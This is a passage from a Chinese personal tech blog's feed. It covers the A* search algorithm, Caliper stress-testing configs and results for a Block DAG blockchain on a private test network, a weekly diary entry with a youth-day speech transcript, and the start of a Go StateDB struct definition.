算法，两者都采用优先队列作为 openlist，而代价函数的不同导致两者具有不同的优点：GBFS 用节点到目标点的距离作为代价函数，将搜索方向引向目标点，搜索效率高；而 Dijkstra 算法采用起点到当前扩展节点的移动代价作为代价函数，能够确保路径最优。<br>那么可不可以将两者的代价函数进行融合，从而<strong>在保证路径最优的同时提高搜索效率</strong>？答案是肯定的，融合后的算法就是<strong>A*算法</strong>。<br>A<em>算法也是一种启发式算法，它的代价函数表示为：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-19.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u5a11f40f&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=174&originalType=url&status=done&style=none&taskId=u6444210b-d148-4737-8444-6e7a899159f&width=87"><br>其中 <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031612-4bb2e537-3a2a-43f0-9430-720081543412.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=ua1c55913&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=39&originalType=url&status=done&style=none&taskId=u81437d7e-75f3-4519-8ad2-3f4d8947340&width=19.5"> 为起点到当前扩展节点的移动代价函数， <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031588-880c54fd-53e9-4a32-ae42-9b033a83bcc7.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u2774a467&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=41&originalType=url&status=done&style=none&taskId=u26212a94-ede6-4884-b185-f79bf3560b3&width=20.5"> 是启发函数，用节点到目标点的距离函数来表示。<br>根据这个式子，可以得到 A</em>算法的几个特点：</p><ul><li>如果令 <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031585-3ccd0531-4927-431f-bb82-79cc2f0029e8.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u734ded48&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=79&originalType=url&status=done&style=none&taskId=u1854bd03-0452-47f9-9cb0-a773eb37eb7&width=39.5"> ，A<em>算法就退化为 Dijkstra 算法；如果令 <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031585-161dbbd5-4e20-44d9-b575-43d61c553747.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u1cba9235&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=77&originalType=url&status=done&style=none&taskId=u1149f333-b9a7-4bf2-a3f1-b93cd429b0c&width=38.5">_，_A</em>算法就退化为 GBFS 算法。</li><li>能否找到最优路径的关键是启发函数 <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725036315-f0c86fa9-aa76-4298-a880-bf792907b269.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u2e57cf76&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=41&originalType=url&status=done&style=none&taskId=u2548ee5d-b15d-4954-9fe6-004bffcb214&width=20.5"> 的选取，如果 <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725036325-3ea21fc5-28b7-4eca-8740-e12dce2238c8.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u7c5a7978&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=41&originalType=url&status=done&style=none&taskId=u0f640d4a-3324-49b1-8fee-a3ec3ce5d3e&width=20.5"> 在大部分情况下比从当前节点到目标点的移动代价小，则能找到最优路径。</li><li>由于 A* 算法的启发函数是位置上的距离，因此在不带位置信息的图数据中不适用。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文将从图搜索算法的基本流程入手，层层递进地介绍几种图搜索算法。首先是两种针对无权图的基本图搜索算法：&lt;strong&gt;深度优先搜索(Depth First Search, DFS)**、&lt;/strong&gt;广度优先搜索(Breadth First Search, BFS)&lt;strong&gt;。它们的区别在于 openlist(后面介绍)所选用的数据结构类型不同，前者使用栈，后者使用队列；之后引入一种启发式搜索算法：&lt;/strong&gt;贪婪最佳优先算法*&lt;em&gt;(&lt;strong&gt;Greedy Best First Search, GBFS&lt;/strong&gt;)，用来提高搜索效率，但是不能确保找到最优路径；最后介绍两种在路径规划中非常经典的算法：&lt;strong&gt;Dijkstra 算法&lt;/strong&gt;、**A\&lt;/em&gt;算法**，前者是广度优先算法(BFS)在带权图中的扩展，后者则是在前者中加入启发函数得到的算法，兼顾效率和完备性。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="https://www.blog.hackerjerry.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    <category term="图论" scheme="https://www.blog.hackerjerry.top/categories/%E7%AE%97%E6%B3%95/%E5%9B%BE%E8%AE%BA/"/>
    
    
    <category term="图搜索算法" scheme="https://www.blog.hackerjerry.top/tags/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>区块链性能测试</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95_new/</id>
    <published>2021-05-06T12:58:59.000Z</published>
    <updated>2021-06-21T06:38:21.678Z</updated>
    
    <content type="html"><![CDATA[<p>对区块链进行性能测试</p><a id="more"></a><h1 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h1><p>目前，主流平台基本支持 Caliper 压力测试。<br>官方文档：<br>【1】<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/4_tools/46_stresstest/caliper_stress_test_practice.html">性能压测工具 Caliper 在 FISCO BCOS 平台中的实践</a><br>【2】<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/tutorial/stress_testing.html#caliper">通过 Caliper 进行压力测试程序</a><br>其他个人业务 demo：<br>【1】<a href="https://blog.csdn.net/manok/article/details/82084852">基于区块链技术的性能测试</a><br>【2】<a href="https://bbs.huaweicloud.com/blogs/204653">基于 Fabric 的性能测试与调优实践</a><br>【3】<a href="https://www.infoq.cn/article/block-chain-practice">区块链性能测评实战案例</a></p><p>其他 web 服务器测压思路比如，Apachebench，redisbench，wrk</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li>网络配置</li><li>设备配置</li><li>redis 截图<ol><li>查询性能</li><li>共识性能</li></ol></li><li>见本子</li></ol><h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;test&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;blockchain&quot;</span>: <span class="string">&quot;block-dag&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;sh block-dag/stress-testing/start.sh&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;end&quot;</span>: <span class="string">&quot;sh block-dag/stress-testing/end.sh&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;minner&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;privateKey&quot;</span>: <span class="string">&quot;bcec428d5205abe0f0cc8a734083908d9eb8563e31f943d760786edf42ad67dd&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;account&quot;</span>: <span class="string">&quot;0x64fa644d2a694681bd6addd6c5e36cccd8dcdde3&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;network&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;nodes&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;192.168.1.1&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;rpcPort&quot;</span>: <span class="string">&quot;6001&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;channelPort&quot;</span>: <span class="string">&quot;9001&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;192.168.1.2&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;rpcPort&quot;</span>: <span class="string">&quot;6001&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;channelPort&quot;</span>: <span class="string">&quot;9001&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;192.168.1.3&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;rpcPort&quot;</span>: <span class="string">&quot;6001&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;channelPort&quot;</span>: <span class="string">&quot;9001&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;authentication&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;key&quot;</span>: <span class="string">&quot;block-dag/stress-testing/sdk/node.key&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;cert&quot;</span>: <span class="string">&quot;block-dag/stress-testing/sdk/node.crt&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;ca&quot;</span>: <span class="string">&quot;block-dag/stress-testing/sdk/ca.crt&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;timeout&quot;</span>: <span class="number">900000</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>command.start</strong><br>首先执行 start 配置中指定的命令，主要用于使用 Docker 模式启动，启动 Caliper 时首先执行当前目录下的 start.sh 文件，其具体内容是：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker -H 192.168.1.1:6001 run -d --rm --name node0 -v /data/test/node0/:/data -p 8000:8000 -p 20914:20914 -p 9001:9001 -w=/data dag/blockdag:latest -c config.ini 1&gt; /dev/null</span><br><span class="line">docker -H 192.168.1.2:6001 run -d --rm --name node1 -v /data/test/node0/:/data -p 8000:8000 -p 20914:20914 -p 9001:9001 -w=/data dag/blockdag:latest -c config.ini 1&gt; /dev/null</span><br><span class="line">docker -H 192.168.1.3:6001 run -d --rm --name node2 -v /data/test/node0/:/data -p 8000:8000 -p 20914:20914 -p 9001:9001 -w=/data dag/blockdag:latest -c config.ini 1&gt; /dev/null</span><br></pre></td></tr></table></figure><p>即启动远程的 Docker 容器。<br><strong>command.end</strong><br>Caliper 在退出流程的最后会执行 end 配置指定的命令，主要用于清理环境。本例中在测试结束时会执行当前目录下的 end.sh 文件，其具体内容是：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker -H 192.168.1.1:6001 stop $(docker -H 192.168.1.1:6001 ps -a | grep node0 | cut -d &quot; &quot; -f 1) 1&gt; /dev/null &amp;&amp; echo -e &quot;\033[32mremote container node0 stopped\033[0m&quot;</span><br><span class="line">docker -H 192.168.1.2:6001 stop $(docker -H 192.168.1.2:6001 ps -a | grep node1 | cut -d &quot; &quot; -f 1) 1&gt; /dev/null &amp;&amp; echo -e &quot;\033[32mremote container node1 stopped\033[0m&quot;</span><br><span class="line">docker -H 192.168.1.3:6001 stop $(docker -H 192.168.1.3:6001 ps -a | grep node2 | cut -d &quot; &quot; -f 1) 1&gt; /dev/null &amp;&amp; echo -e &quot;\033[32mremote container node2 stopped\033[0m&quot;</span><br></pre></td></tr></table></figure><p>即停止并删除有所的远程容器。<br><strong>network.nodes</strong><br>一个包含了所有要连接节点的列表，列表中每一项需要指明被连接节点的 IP 地址、RPC 端口及 Channel 端口号，所有端口号需要和节点的配置文件保持一致。<br><strong>network.authentication</strong><br>适配器向节点的 Channel 端口发起请求时需要使用 CA 根证书等文件，这些文件已在 3.1.2 节中调用 build_chain.sh 脚本时已经生成好，使用任一节点配置下的 sdk 文件夹中的相应文件即可，需要在该配置中写上所有文件的路径。</p><h1 id="测试配置"><a href="#测试配置" class="headerlink" title="测试配置"></a>测试配置</h1><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">test:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">stress</span> <span class="string">test</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">This</span> <span class="string">is</span> <span class="string">a</span> <span class="string">stress</span> <span class="string">testing</span> <span class="string">of</span> <span class="string">Block</span> <span class="string">DAG.</span></span><br><span class="line">  <span class="attr">clients:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">local</span></span><br><span class="line">    <span class="attr">number:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">rounds:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">label:</span> <span class="string">create</span></span><br><span class="line">      <span class="attr">description:</span> <span class="string">Test</span> <span class="string">performance</span> <span class="string">of</span> <span class="string">creating</span> <span class="string">txs</span></span><br><span class="line">      <span class="attr">txNumber:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="number">15000</span></span><br><span class="line">      <span class="attr">callback:</span> <span class="string">block-dag/stress-testing/create.js</span></span><br><span class="line"><span class="attr">monitor:</span></span><br><span class="line">  <span class="attr">type:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span></span><br><span class="line">  <span class="attr">docker:</span></span><br><span class="line">    <span class="attr">name:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http://192.168.1.1:6001</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http://192.168.1.2:6001</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http://192.168.1.3:6001</span></span><br><span class="line">  <span class="attr">interval:</span> <span class="number">0.1</span></span><br></pre></td></tr></table></figure><p>测试文件中主要包括两部分：</p><ul><li>测试内容配置</li></ul><p>test 项负责对测试内容进行配置。配置主要集中在 round 字段中指定如何对区块链系统进行测试。每一个测试可以包含多轮，每一轮可以向区块链发起不同的测试请求。<br>本次测试是对系统的 createTx 接口进行测试。在测试中，可以通过 txNumber 字段指定测试的交易发送数量</p><ul><li>性能监视器配置</li></ul><p>monitor 项负责对测试所使用的性能监视器的进行配置。每项配置项的解释如下：</p><ol><li>monitor.type，需要指定为 docker，指对 docker 容器进行监控；</li><li>monitor.docker.name，一个包含所有要监视的节点的 docker 容器名称列表；</li><li>monitor.interval，监视器的采样间隔，单位为秒。</li></ol><h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>实际测试中，我选择类似 Apache 的测试结果。<br>全是正常交易</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Tx Length:</span> <span class="number">217088</span> <span class="string">bytes</span>       <span class="string">交易数据的长度</span></span><br><span class="line"><span class="attr">Total Txs Number:</span> <span class="number">15000</span></span><br><span class="line"><span class="attr">Time taken for tests:</span> <span class="number">5.919</span> <span class="string">seconds</span>    <span class="string">所有这些交易发送完所花费的时间</span></span><br><span class="line"><span class="attr">Complete requests:</span> <span class="number">15000</span>             <span class="string">完成请求数</span></span><br><span class="line"><span class="attr">Failed requests:</span> <span class="number">0</span>                <span class="string">失败请求数</span></span><br><span class="line"><span class="attr">Write errors:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">Total transferred:</span> <span class="number">3256320000</span> <span class="string">bytes</span>     <span class="string">网络总传输量</span></span><br><span class="line"><span class="attr">TPS:</span> <span class="number">2536.3</span> [<span class="comment">#/sec] (mean) 吞吐量-每秒交易数</span></span><br><span class="line"><span class="attr">Time per request:</span> <span class="number">1.513</span> [<span class="string">ms</span>] <span class="string">(mean</span>, <span class="string">across</span> <span class="string">all</span> <span class="string">concurrent</span> <span class="string">requests)</span> <span class="string">并发的每个请求平均消耗时间</span></span><br><span class="line"><span class="attr">Transfer rate:</span> <span class="number">67.15</span> [<span class="string">Mbytes/sec</span>] <span class="string">received</span> <span class="string">平均每秒网络上的流量，可以帮助排除是否存在网络流量过大导致响应时间延长的问题</span></span><br></pre></td></tr></table></figure><p>说明:<br>Tx 长度为 212 kb，换算为字节是 217088 bytes</p><blockquote><p>用 nodejs 打印上述结果</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-1.png#clientId=ue0d8159d-8879-4&from=paste&height=269&id=uf8e241e5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=538&originWidth=854&originalType=binary&size=66022&status=done&style=none&taskId=ua2f5d267-1fbc-46ce-a75d-7e48fa43834&width=427" alt="image.png"><br>打印区块<br>getMaxHeightBlock 接口–最高块<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-2.png#clientId=ue0d8159d-8879-4&from=paste&height=302&id=udab02a53&margin=%5Bobject%20Object%5D&name=image.png&originHeight=599&originWidth=978&originalType=binary&size=115789&status=done&style=none&taskId=u2ed02707-9654-4dfb-8fb5-77517ad6a23&width=493" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-3.png#clientId=ue0d8159d-8879-4&from=paste&height=348&id=ubdbcfa19&margin=%5Bobject%20Object%5D&name=image.png&originHeight=679&originWidth=909&originalType=binary&size=108543&status=done&style=none&taskId=u82ff9afe-2c69-4356-9d50-5d83d492427&width=465.5" alt="image.png"><br>这里注意到，每个块包含 60 个交易，60*95=5700&gt;3000（为平均每节点分配到的交易量），这里存在几种原因：<br>① 在并发生成块的时候，由于节点间的速率差异与网络延迟而导致当时观察到的 Tip 集不同，而导致的区块高度高于预期高度。<br>② 由于处理交易的时候对于放在交易缓存池中的未打包交易进行转发操作，并标记为未打包，导致其中的一些交易被不同的节点重复打包，而导致打包交易量大于预期。</p><p>解释各个字段的含义</p><p>再通过 rpc 端口查询每个节点中各自存储的交易量<br>（发送 GET 请求到 channel 端口进行查询）</p><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-4.png#clientId=ue0d8159d-8879-4&from=paste&height=85&id=u7c0e6c3b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=169&originWidth=808&originalType=binary&size=23484&status=done&style=none&taskId=u8db7b66d-e3cc-446c-ae3b-7416ee176a8&width=404" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-5.png#clientId=ue0d8159d-8879-4&from=paste&height=81&id=ud52b21b6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=812&originalType=binary&size=23217&status=done&style=none&taskId=u0c59e8b2-326d-4414-b250-f3334c30c2e&width=406" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-6.png#clientId=ue0d8159d-8879-4&from=paste&height=85&id=ue659a490&margin=%5Bobject%20Object%5D&name=image.png&originHeight=169&originWidth=805&originalType=binary&size=24212&status=done&style=none&taskId=u667e9356-a241-4ac0-9ab5-3676f248e40&width=402.5" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;对区块链进行性能测试&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>生活周报-May-3-to-10</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/04/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-3-to-10_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/04/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-3-to-10_new/</id>
    <published>2021-05-04T02:43:45.000Z</published>
    <updated>2021-06-21T06:38:28.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>五四青年节，知乎发布微电影《重逢》，讲述了关于肖思远烈士的事，回答了这样一个时代问题——“当代年轻人还有没有不计生死的热血”，我没有看影片，只看了些许回答就已经泣不成声，酸楚涌上心头，豆大的眼泪滴落许久。是的，我在床上浏览着手机，这和平的岁月，都是这群最可爱的人为我们负重前行换来的。身为青年一代，我何曾忘记报国之志，家国之情溢于言表，流淌着的热血，奔涌的黄河，人民在召唤，时代在召唤，吾辈当不负重任，砥砺前行。</li><li>B 站发布了新的演讲，这次的演讲十分淳朴，也十分有感染力，下面是演讲全文：</li></ol><p>那些想从我们身上 看到中国未来的人<br>亲爱的父母 师长 前辈<br>其实我还不知道 想成为什么样的人<br>但能和你们分享的是<br>我不想做什么样的人<br>我不想做一个拿着锯子的人<br>随时随地 把人群锯成两半<br>这一半是女人 那一半是男人<br>这一半是盟友 那一半是对手<br>对手赞同的我们必须反对<br>对手反对的我们必须赞同<br>不论对错 只争输赢<br>我不想做一个浑身带刺的人<br>嘲讽别人的成功 嘲笑别人的失败<br>看不惯过得比他好的人<br>看不起过得没他好的人<br>一肚子抱怨和借口<br>凡事不是自己的错 都是别人的错<br>我不想做一个 流水线上制造出来的人<br>没有独立的人格 只有预定的人设<br>没有闪光的才华 只有抛光的流量<br>没有精彩的作品 只有热闹的八卦<br>我不想做一个隐身的人<br>需要挺身而出的时候 他藏在人群里<br>需要解决问题的时候 他消失在所有人的视线里<br>我不想做一个油腻的人<br>你吃亏的时候他说吃亏是福<br>该较真的时候他说难得糊涂<br>是的，我不想做这样的人<br>我不想做一个没有同情心的人<br>一个不讲义气的人<br>一个没有教养的人<br>一个半途而废的人<br>一个遗忘历史的人<br>我不想 做一个不爱国的人<br>我不想做一个 口口声声 “一代不如一代”的人<br>当我变成父母 师长 前辈的时候<br>希望 我的孩子会对我说<br>我想成为你这样的人。</p><ol start="3"><li>盖茨离婚</li><li>狗狗币暴涨 300 倍，炒币的世界我不懂。</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>朋友送的糕点很好吃，在阳光天地的西木栗子有卖。</li><li>买了一只大吉岭的香水小样还不知道什么味道。–越闻越好闻，前调的烟草味有点大，中调很有感觉，是那种草木香气。</li><li>立夏了，气温开始在 30 度徘徊了。</li><li>买了嘉华鲜花饼，送给老妈当母亲节礼物，玫瑰馅的应该挺好吃的？</li><li>去看了牙，医生说智齿都要拔掉。</li><li>去咨询了一下正畸医生，不太敢正畸了。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>看知乎</p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>伍六七第三季最后一集！《你是我想保护的人》，梅小姐这次选择拼尽全力保护阿柒，爱了爱了！而阿柒，用魔刀千刃给梅小姐的剑“续命”，真爱无疑！然而，剧情戛然而止了，挖了一堆坑，注意，是一堆坑！还要出大电影，还真就从一个爆款 IP 上面疯狂捞金呗。</li></ol><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><blockquote><p>来自知乎：<strong>当代社会中，青年的五四精神会有哪些具体表现？</strong></p></blockquote><ul><li>第一点就是<strong>爱国</strong>，这一条都做不到也无从谈起。任何时候，爱国都是第一位，也是不能撼动的。</li><li>第二点就是<strong>敬业</strong>，做好本职工作，脚踏实地的工作，认认真真的工作，不要得陇望蜀，好高骛远。</li><li>第三点就是<strong>明志</strong>，志即志向或者理想，一个人要有自己的目标，不能得过且过，当一天和尚撞一天钟。作为青年，需要有自己的人生规划。</li><li>第四点就是<strong>静心</strong>，国家发展越来越快，社会节奏越来越快，快节奏的生活让人一夜暴富，一夜成名，这让许多人都变得越来越浮躁，内心静不下来，空中楼阁的繁华富贵让许多人迷失了自我。</li></ul><blockquote><p>这是从一篇 coolhash 测压的文章中看到的，作者说：“是存在差距，但是可以站着学习，而不是跪着膜拜，一味跟从只会丧失判断力和创新力，香港的年轻人曾经不相信大陆的 taobao 会比 eBay 强大，QQ 会比 MSN 强大，直到 MSN 垮了仍然不相信是真的，没有信心，没有努力，梦想只会变成做梦。”</p></blockquote><p>曾国藩：窃喜洋人之智巧，我中国人亦能为之，彼不能傲我以其所不知矣!</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>如何对区块链系统测试。</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>又是一年青年节，在互联网多元文化的滋润下成长起来的新生代，给这个时代带来了新的课题，你不想成为一个什么样的人？</li></ol><p>我们总说，“君子有所为，有所不为”。年轻人何尝不是如此？<strong>那些非凡的勇气、思辨的精神、激扬的斗志，极尽人们对青春年华的无限想象；那些意志的消磨、生活的妥协、人生的沉沦，也在提醒人们对未老先衰的潜在担忧。</strong>从这个意义上来说，我们礼赞青年，不只是为了体现对青春年少的呵护，更是为了帮助青年扫除心灵的阴霾；我们歌颂青春，不只是为了了却人生苦短的遗憾，更是为了诠释时光荏苒的意义。要知道，青年人最大的资本，恰恰是最容易被自己忽视的青春；青春最值得的回忆，正是追逐梦想、成长奋斗的痕迹。<br>诗人塞缪尔·厄尔曼在《青春》中这样写道：“人人心中皆有一台天线，只要还能接受美好、希望、欢乐、勇气和力量的信号，就能青春永驻，风华常存。”<strong>架起这台心灵的“天线”，去感受日月星辰，去明辨是非曲直，去体悟人生百态，每一个成长的灵魂，就一定都能找到“你想成为怎样的人”和“我不想做这样的人”的完美答案。</strong><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-3-to-10-1.jpeg#clientId=ud5d56b56-b62c-4&from=paste&height=505&id=u6ef2f665&margin=%5Bobject%20Object%5D&originHeight=1009&originWidth=679&originalType=url&status=done&style=none&taskId=ub78ac62c-0766-4032-984a-851d51f1c7e&width=339.5"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;五四青年节，知乎发布微电影《重逢》，讲述了关于肖思远烈士的事，回答了这样一个时代问题——“当代年轻人还有没有不计生死的热血”，我</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>区块链底层-状态机StateDB</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB_new/</id>
    <published>2021-05-03T08:22:12.000Z</published>
    <updated>2021-06-21T06:35:28.613Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="全局"><a href="#全局" class="headerlink" title="全局"></a>全局</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB-1.png#clientId=u1d1d90de-5c3e-4&from=paste&height=344&id=ub777611d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=688&originWidth=1306&originalType=binary&size=308117&status=done&style=none&taskId=u950bfa17-cd9c-4cde-b1d9-eb903342901&width=653" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB-2.png#clientId=u1d1d90de-5c3e-4&from=paste&height=200&id=u4a6a08ef&margin=%5Bobject%20Object%5D&name=image.png&originHeight=399&originWidth=969&originalType=binary&size=146076&status=done&style=none&taskId=ude525437-624d-4812-952f-2b51a1576ff&width=484.5" alt="image.png"></p><h1 id="创建状态树"><a href="#创建状态树" class="headerlink" title="创建状态树"></a>创建状态树</h1><p>状态数据库的定义如下：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> StateDB <span class="keyword">struct</span> &#123;</span><br><span class="line">db   Database  <span class="comment">//操作状态的底层数据库，在实例化 StateDB 时指定 ②。</span></span><br><span class="line">trie trie.Trie <span class="comment">//世界状态所在的树实例对象</span></span><br><span class="line">stateObjects      <span class="keyword">map</span>[account.Address]*account.StateObject <span class="comment">//已账户地址为键的账户状态对象，能够在内存中维护使用过的账户</span></span><br><span class="line">stateObjectsDirty <span class="keyword">map</span>[account.Address]<span class="keyword">struct</span>&#123;&#125;<span 